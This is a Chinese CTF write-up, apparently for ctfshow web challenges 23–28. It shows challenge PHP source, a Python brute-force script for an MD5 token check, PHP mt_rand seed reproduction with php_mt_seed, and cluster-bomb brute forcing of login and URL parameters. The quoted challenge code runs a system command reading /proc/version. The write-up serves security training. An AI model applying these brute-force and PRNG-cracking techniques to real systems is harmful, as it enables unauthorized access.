> hint：域名也可以爆破的，试试爆破这个ctf.show的子域名

对域名进行爆破，先访问一下看看

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507940784-d39dc291-7c25-46fc-ac67-6621b6b0d54c.png)

 访问到vip.ctf.show时，发现flag  

## web23

> hint：还爆破？这么多代码，告辞！

```php
<?php

  /*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
* 上述部分是代码的头部信息，包含了编码格式声明、作者、日期、修改信息以及联系方式等相关说明，但通常和具体代码逻辑执行关联不大。
*/

  // 关闭 PHP 的错误报告，这样在代码执行过程中如果出现错误，不会显示错误信息到页面等输出位置
  error_reporting(0); 

// 引入名为 'flag.php' 的文件，通常这里面可能包含了要输出的关键信息（比如题目中的 'flag'），但代码中未展示其具体内容
include('flag.php'); 

// 判断是否通过 GET 方式传递了名为 'token' 的参数
if (isset($_GET['token'])) { 
  // 如果传递了 'token' 参数，对其进行 MD5 加密处理，将加密后的结果赋值给 $token 变量
  $token = md5($_GET['token']); 
  // 以下是一系列的条件判断，用于验证 $token 加密后字符串的特定位置字符是否满足一定关系
  if (substr($token, 1, 1) === substr($token, 14, 1) && substr($token, 14, 1) === substr($token, 17, 1)) {
    // 这里进一步验证通过截取 $token 字符串特定位置字符转换为整数后进行数学运算的结果是否满足特定条件
    // 先将截取到的字符转换为整数，进行加法运算后除以第一个截取的字符，判断结果是否等于另一个截取位置字符转换后的整数
    if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {
      // 如果上述所有条件都满足，就输出 $flag 变量的值，这里的 $flag 应该是从之前引入的 'flag.php' 文件中获取到的关键信息
      echo $flag; 
    }
  }
} else {
  // 如果没有通过 GET 方式传递 'token' 参数，就使用 highlight_file 函数输出当前 PHP 文件的源代码内容，方便查看代码逻辑等情况
  highlight_file(__FILE__);
}

?>
```

写脚本

```python
import hashlib

# 定义要验证的条件函数
def check_token(token_md5):
    if len(token_md5) < 32:
        return False
    first_char = token_md5[1:2]
    fourteenth_char = token_md5[14:15]
    seventeenth_char = token_md5[17:18]
    thirty_first_char = token_md5[31:32]
    if first_char == fourteenth_char and fourteenth_char == seventeenth_char:
        try:
            first_int = int(first_char, 16)
            # 添加判断，如果first_int为0，直接返回False，避免出现除数为0的错误
            if first_int == 0:
                return False
            sum_value = first_int + int(fourteenth_char, 16) + int(seventeenth_char, 16)
            result = sum_value / first_int
            thirty_first_int = int(thirty_first_char, 16)
            return result == thirty_first_int
        except ValueError:
            return False
    return False

# 简单的循环尝试不同的token值（这里示例只是简单从数字开始尝试，可以根据实际情况扩展范围等）
for i in range(100000):
    token = str(i)
    token_md5 = hashlib.md5(token.encode()).hexdigest()
    if check_token(token_md5):
        print(f"可能的token值: {token}")

```

结果如下

```plain
可能的token值: 422
可能的token值: 1202
可能的token值: 13702
可能的token值: 15456
可能的token值: 20770
可能的token值: 22877
可能的token值: 46617
可能的token值: 48969
可能的token值: 49255
可能的token值: 54388
可能的token值: 54674
可能的token值: 59384
可能的token值: 63281
可能的token值: 64413
可能的token值: 66039
可能的token值: 66478
可能的token值: 82614
可能的token值: 88310
可能的token值: 93326
```

输入得 flag

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736488545009-78714aca-8c79-41d7-b809-6228bfb06821.png)

## web24

> hint：爆个🔨

```php
<?php

  /*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

* 上述部分是代码开头的注释信息，包含了编码格式声明、作者、日期、修改时间以及作者的邮箱和相关链接等内容，属于代码的元信息描述，和核心逻辑执行关联性不大。
*/

  // 关闭PHP的错误报告功能，意味着代码执行过程中即使出现错误，也不会主动向页面等输出位置显示错误提示信息。
  error_reporting(0); 

// 引入名为 "flag.php" 的文件，通常推测这个文件里可能定义了关键的变量（比如可能存储着要输出的类似 "flag" 这样的关键信息），不过这里没有展示 "flag.php" 的具体内容。
include("flag.php"); 

// 判断是否通过GET方式传递了名为 "r" 的参数。
if (isset($_GET['r'])) { 
  // 如果传递了名为 "r" 的参数，就将其值赋给变量 $r。
  $r = $_GET['r']; 
  // 使用固定的种子值 372619038 来初始化随机数生成器（mt_srand），这意味着后续每次调用 mt_rand() 生成的随机数序列将是固定的。
  mt_srand(372619038); 
  // 将用户传入的参数 $r 转换为整数（intval），并与通过 mt_rand() 函数生成的随机数（同样转换为整数后）进行严格相等（===）比较。
  // 如果两者相等，就输出 $flag 变量的值，这里的 $flag 应该就是从前面引入的 "flag.php" 文件中获取到的关键信息。
  if (intval($r) === intval(mt_rand())) {
    echo $flag;
  }
} else {
  // 如果没有通过GET方式传递 "r" 参数，就先使用 highlight_file 函数输出当前这个PHP文件自身的源代码内容，方便查看代码逻辑等情况。
  highlight_file(__FILE__); 
  // 接着执行系统命令 "cat /proc/version"，并输出该命令执行后的结果，这个命令通常用于查看当前系统的内核版本等相关信息。
  echo system('cat /proc/version');
}

?>
```

> ✨伪随机数
>
> mt_srand(372619038) 已经用固定的种子初始化了
>
> mt_rand() 在相同次数生成的随机数都是固定的
>
> 比如两台设备，使用同一个随机数种子初始化之后。他们相同次数产生的随机数是一致的，但是不同次数之间产生的随机数是不一致的。

```php
<?php
mt_srand(372619038);
echo intval(mt_rand());
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736491792513-4ed4debf-db76-434b-9b3f-6e6a26664039.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736491828893-f9abbf7d-80ea-440b-9f54-2df95ed9e769.png)

## web25

> hint：爆个🔨，不爆了

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

* 上述部分是代码头部的注释信息，包含了诸如编码格式声明、作者信息、创建及修改日期、作者邮箱以及相关链接等内容，主要是对代码的一些基础描述，与具体的代码执行逻辑关联性不大。
*/

// 关闭PHP的错误报告功能，这样在代码执行过程中如果出现错误，不会将错误信息显示在页面等输出位置。
error_reporting(0); 

// 引入名为"flag.php"的文件，通常这个文件里可能定义了关键的变量（例如可能包含了要输出的类似"flag"这样的重要信息），不过代码中并未展示"flag.php"的具体内容。
include("flag.php"); 

// 判断是否通过GET方式接收到名为"r"的参数。
if (isset($_GET['r'])) { 
    // 如果接收到了名为"r"的参数，将其值赋给变量$r。
    $r = $_GET['r']; 
    // 以下这行代码逻辑较为关键且复杂：
    // 首先对$flag变量（从前面引入的"flag.php"中获取，推测其存储重要信息）进行MD5加密，然后截取加密结果的前8个字符，再通过hexdec函数将这8个十六进制字符转换为十进制数，最后用这个十进制数作为种子来初始化随机数生成器（mt_srand）。
    // 这样做意味着随机数生成的序列是基于$flag的部分MD5值来确定的，增加了一定的关联性和复杂性。
    mt_srand(hexdec(substr(md5($flag), 0, 8))); 
    // 计算一个差值，用通过GET方式获取的参数$r转换为整数后，减去由初始化后的随机数生成器（基于前面的规则）生成的随机数（同样转换为整数），并将这个差值赋值给变量$rand。
    $rand = intval($r) - intval(mt_rand()); 
    // 判断$rand的值是否为0（通过将$rand作为布尔值判断，值为0时在PHP中会被视为false，非0值视为true），如果为0，进入下面的嵌套判断。
    if ((!$rand)) { 
        // 进一步判断，检查名为"token"的COOKIE值是否等于两次调用mt_rand函数生成的随机数相加的结果（这里每次生成的随机数基于前面设定的种子，有一定关联性）。
        // 如果这个条件也满足，就输出$flag变量的值，也就是期望的关键信息。
        if ($_COOKIE['token'] == (mt_rand() + mt_rand())) {
            echo $flag;
        }
    } else {
        // 如果$rand的值不为0，直接输出这个差值$rand的值，可能用于调试或者反馈给用户一些信息。
        echo $rand;
    }
} else {
    // 如果没有通过GET方式接收到名为"r"的参数，先使用highlight_file函数输出当前这个PHP文件自身的源代码内容，方便查看代码逻辑等情况。
    highlight_file(__FILE__); 
    // 接着执行系统命令"cat /proc/version"，并输出该命令执行后的结果，这个命令通常用于查看当前系统的内核版本等相关信息。
    echo system('cat /proc/version');
}

?>
```

> ✨我们可以看到这次生成的随机数也是固定的，先传入 r=0，得到 mt_rand() 的值

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736492767523-99e2bf71-c4a1-4ef5-a557-10ea0d97d40c.png)

> ✨看出 mt_rand()值为 47716040 , 传入 r= 47716040
>
> 使用 php_mt_seed 脚本爆破种子
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736496632540-2b7bb313-cb14-444e-86f3-0a05bc2accec.png)
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736498071280-62a1719c-caa5-440d-8cdf-7a05240754ae.png)
>
> 可见，我们爆出了一堆种子，并且知道了版本，那么之后一个一个试

```php
<?php
mt_srand(2795750851);
echo mt_rand().PHP_EOL;
echo mt_rand()+mt_rand();
// token的值第二和第三次随机数的和
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736498202895-0552e597-7f61-495f-9aed-c49a69d1159c.png)

## web26

> hint：这个可以爆

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500384589-3ed8d558-2902-43fd-a3f3-c88beba87e36.png)

抓包爆破

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500299038-cb96062f-f75a-420b-a8fc-a403b63e1289.png)

## web27

> hint：CTFshow菜鸡学院招生啦！

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500513981-b2073974-ddcd-4caf-89d0-cd22fe2307fb.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500523116-8c13867b-7ab5-403b-a2d7-f9056aae9d26.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500624181-db968548-bd20-480a-a0c9-fce658ba3bb2.png)

抓包爆破

使用集束爆破

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501908349-d0014ab6-2348-4947-bdb9-70e8a3854936.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501935892-cef209be-c9af-4e69-a1d9-54b057babe31.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501953228-5d6479da-2e27-4deb-90f9-aee791c38bc3.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501971297-880b3d2a-74b1-4b4c-82f3-7e61d79b8f56.png)

爆破出是 19900201

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501989385-e695d003-89a3-471d-bebf-55c6f6fa4ba9.png)

解码一下

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502029401-b2774d21-4e61-45b7-be0f-cbe1cd806820.png)

解码一下

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502395495-2129c488-0b04-4b61-891f-6d6d46c403fc.png)

结束

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502475488-30953c80-c012-41a5-af17-a2715351e083.png)

## web28

> hint：大海捞针

看 url 有 3 个位置可以爆破

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736506786703-7e643696-17e4-48c9-abac-1700e6f73678.png)

> ✨通过多次测试，只要位置 3 存在，无论修改哪个位置，都会导致页面重定向，因此要删去位置 3，对 1 和 2 位置进行爆破

使用集束爆破

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505844001-5a196ae1-6a6a-41dd-9645-ec7e6dffcbd9.png)

设定从 0 到 100

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505863300-8af6470e-5f19-45d8-9fda-306326e271cc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505888075-ee6ecf42-d1e4-4235-92bb-b2db61c8a2d9.png)

出结果了

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505922713-51c5e2d4-858c-4ef4-9ba9-22dc28f736d9.png)

 查看响应

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505933160-dad0a258-f48a-41b4-833a-9fc42a49decd.png)

